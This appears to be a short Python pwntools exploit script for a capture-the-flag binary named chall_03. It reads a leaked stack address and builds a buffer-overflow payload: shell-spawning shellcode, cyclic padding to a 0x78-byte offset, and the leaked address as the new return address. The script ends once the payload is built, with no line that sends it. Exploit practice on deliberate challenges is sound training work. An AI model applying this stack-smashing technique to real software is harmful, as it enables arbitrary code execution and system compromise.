from pwn import *

# NX disabled == shellcode

context.arch = 'amd64'

p = process('./chall_03')

p.sendline(b'junk')

p.recvuntil(b'it: ')

leak = int(p.recvline().decode('utf-8').strip(), 16)

# rule of ryan
offset = 0x70 + 0x8


shellcode = asm(shellcraft.sh())

payload = shellcode + cyclic(offset - len(shellcode)) + p64(leak)